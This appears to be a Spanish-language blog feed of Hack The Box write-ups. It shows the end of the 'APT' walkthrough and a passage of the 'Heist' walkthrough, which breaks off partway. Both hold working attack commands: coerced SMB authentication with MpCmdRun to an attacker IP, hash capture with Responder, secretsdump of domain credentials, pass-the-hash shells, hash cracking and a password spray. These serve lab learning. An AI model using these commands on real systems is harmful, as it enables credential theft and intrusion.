<span class="nt">-a----</span>         3/4/2021   4:58 AM         335360 MpCommu.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM         113152 MpEvMsg.dll
<span class="nt">-a----</span>         3/4/2021   5:01 AM         101888 MpOAV.dll
<span class="nt">-a----</span>         1/7/2021  10:55 PM         178176 MpProvider.dll
<span class="nt">-a----</span>         3/4/2021   4:57 AM         526336 MpRtp.dll
<span class="nt">-a----</span>         3/4/2021   4:55 AM        2000384 MpSvc.dll
<span class="nt">-a----</span>         3/4/2021   5:02 AM          76288 MsMpCom.dll
<span class="nt">-a----</span>         3/4/2021   5:42 AM          97184 MsMpEng.exe
<span class="nt">-a----</span>         3/4/2021   5:05 AM           4608 MsMpLics.dll
<span class="nt">-a----</span>         3/4/2021   5:03 AM          53248 NisLog.dll
<span class="nt">-a----</span>         3/4/2021   5:48 AM         339400 NisSrv.exe
<span class="nt">-a----</span>         3/4/2021   5:03 AM          66048 NisWfp.dll
<span class="nt">-a----</span>        4/28/2017  12:52 AM         551424 ProtectionManagement.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM          57424 ProtectionManagement.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM           2570 ProtectionManagement_Uninstall.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM         156864 SymSrv.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM              1 SymSrv.yes
<span class="nt">-a----</span>        7/16/2016   2:12 PM           1091 ThirdPartyNotices.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt;
</code></pre></div></div>

<ul>
  <li>Con esto vamos a escanear un archivo de un recurso compartido a nivel de red de nosotros que no es obligatorio que exista solo es para hacer la autenticación y robar el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.222<span class="se">\y</span>o
</code></pre></div></div>

<ul>
  <li>Nos llega el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>ON]
    Force ESS downgrade        <span class="o">[</span>ON]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.222]
    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...

[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
</span></code></pre></div></div>

<ul>
  <li>
    <p>Podríamos usar esta web para crackear el hash pero esta en mantenimiento <a href="https://crack.sh/get-cracking/">https://crack.sh/get-cracking/</a> y como no esta operativa no podemos crackear el hash así yo le pedí a mi compañero que en su momento hiso la maquina que me pasara el hash por que la pagina web estaba operativa cuando el la hiso.</p>
  </li>
  <li>
    <p>Con el hash podemos <code class="language-plaintext highlighter-rouge">dumpear</code> todos los hashes de los usuarios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="s1">'htb.local/APT$@apt'</span> <span class="nt">-hashes</span> :d167c3238864b12f5f82feae86a7f798
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT<span class="nv">$:</span>aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT<span class="nv">$:</span>aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT<span class="nv">$:</span>des-cbc-md5:76c45245f104a4bf
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>Ahora teniendo el hash del usuario administrador podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-wirnm</code> y obtener la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'c370bddf384a691d811ff3495e8a72e2'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
c52c0f60732da145b5ca1d4da4a65287
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Heist (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html" rel="alternate" type="text/html" title="HackTheBox - Heist (easy)" /><published>2024-04-13T00:00:00-06:00</published><updated>2024-04-13T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html"><![CDATA[<p><img src="https://labs.hackthebox.com/storage/avatars/131dbaba68b169bd5ff59ac09420b09f.png" alt="busqueda-avatar" /></p>

<p>En este post vamos a estar haciendo la maquina Heist de la plataforma de Hack The Box donde mediante hashes de Cisco Password 7 que crackeamos vamos a hacer un password spray para ver a que usuario pertenece vamos a estar usando impacket-lookupsid para descubrir nuevos usuarios y conectarnos con evil-wirnm ya que el usuario forma parte del grupo Remote Management Users y para la escalada de privilegios mediante strings vamos a analizar un volcado de un PID que esta corriendo Firefox donde las credenciales serán las del usuario Administrador.</p>

<h3 id="portscan"><strong>PortScan</strong></h3>

<ul>
  <li>Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th>Uso</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Escanear todo el rango de puertos (65535) por el protocolo TCP.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Solo queremos ver puertos abiertos.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Para que nos reporte los puertos que vaya encontrando por la consola.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Para que no aplique resolución DNS.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Esto es para indicarle que omita el descubrimiento de hosts.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Para exportar la salida en formato Greppable.</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.116.26 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-13 14:27 CST
Initiating SYN Stealth Scan at 14:27
Scanning 10.129.116.26 <span class="o">[</span>65535 ports]
Discovered open port 49669/tcp on 10.129.116.26
Discovered open port 5985/tcp on 10.129.116.26
Discovered open port 80/tcp on 10.129.116.26
Discovered open port 135/tcp on 10.129.116.26
Discovered open port 445/tcp on 10.129.116.26
Increasing send delay <span class="k">for </span>10.129.116.26 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
Completed SYN Stealth Scan at 14:27, 52.89s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.129.116.26
Host is up, received user-set <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2024-04-13 14:27:02 CST <span class="k">for </span>53s
Not shown: 65530 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
</code></pre></div></div>

<ul>
  <li>Ahora usamos la función <code class="language-plaintext highlighter-rouge">extractPorts</code> para copear los puertos abiertos a la <code class="language-plaintext highlighter-rouge">clipboard</code> y escanear los servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap which extractPorts
extractPorts <span class="o">()</span> <span class="o">{</span>
	<span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
	<span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">cat </span>extractPorts.tmp
	<span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>La ejecutamos y nos copea los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap extractPorts allPorts

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...

	<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.129.116.26
	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,135,445,5985,49669

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<ul>
  <li>Ahora seguimos con el escaneo de los servicios de los puertos abiertos.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Uso</th>
      <th>Párametro</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos.</td>
      <td>-sCV</td>
    </tr>
    <tr>
      <td>Que no lo exporte a un archivo normal.</td>
      <td>-oN</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,5985,49669 10.129.116.26 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-13 14:31 CST
Nmap scan report <span class="k">for </span>10.129.116.26
Host is up <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: <span class="nt">-4s</span>
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-13T20:32:40
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> vemos las tecnologías que esta usando en el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">PHPSESSID</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="n">login</span><span class="p">.</span><span class="nf">php</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="nf">php</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">7</span><span class="p">],</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">PHPSESSID</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">PasswordField</span><span class="p">[</span><span class="n">login_password</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Support</span> <span class="no">Login</span> <span class="no">Page</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos que nos redirige a un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/1.png" />
</p>

<ul>
  <li>Si observamos en la parte de abajo nos dice <code class="language-plaintext highlighter-rouge">Login as guest</code> si damos <code class="language-plaintext highlighter-rouge">click</code> vemos que funciona correctamente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/2.png" />
</p>

<ul>
  <li>El usuario Hazard nos habla de que ah estado experimentando problemas con su <code class="language-plaintext highlighter-rouge">router cisco</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/3.png" />
</p>

<ul>
  <li>Si vemos el <strong>Attachment</strong> nos muestra el archivo de configuración que nos dice que el usuario <strong>admin</strong> estaba usando.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/4.png" />
</p>

<ul>
  <li>Vemos que mencionan mucho el <code class="language-plaintext highlighter-rouge">password</code> 7.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
</code></pre></div></div>

<ul>
  <li><a href="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html">https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html</a> podemos apoyarnos de ese recurso para poder ver las contraseñas en texto plano simplemente pasándole el hash <code class="language-plaintext highlighter-rouge">0242114B0E143F015F5D1E161713</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/5.png" />
</p>

<ul>
  <li>Esta es del otro hash.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/6.png" />
</p>

<ul>
  <li>Podemos aplicar un <code class="language-plaintext highlighter-rouge">PasswordSpray</code> para probar las credenciales que tenemos y el usuario Hazard.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
admin
rout3r
hazard
</code></pre></div></div>

<ul>
  <li>Si recordamos también nos dan un hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat hash</span>
<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
</code></pre></div></div>

<ul>
  <li>Podemos usar <code class="language-plaintext highlighter-rouge">john</code> para crackearlo y añadirlo a nuestra lista para poder aplicar el <code class="language-plaintext highlighter-rouge">password spray</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
stealth1agent    <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:32 DONE <span class="o">(</span>2024-04-13 15:00<span class="o">)</span> 0.03101g/s 108732p/s 108732c/s 108732C/s stealthy001..ste88dup
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Estas son las contraseñas que tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>creds.txt
Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
<span class="nv">$uperP</span>@ssword
stealth1agent
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos credenciales validas para el usuario hazard.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 -u users.txt -p creds.txt --continue-on-success
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
</code></pre></div></div>

<ul>
  <li>Tenemos estos recursos compartidos a nivel de red pero no son interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> hazard <span class="nt">-p</span> stealth1agent <span class="nt">--shares</span>
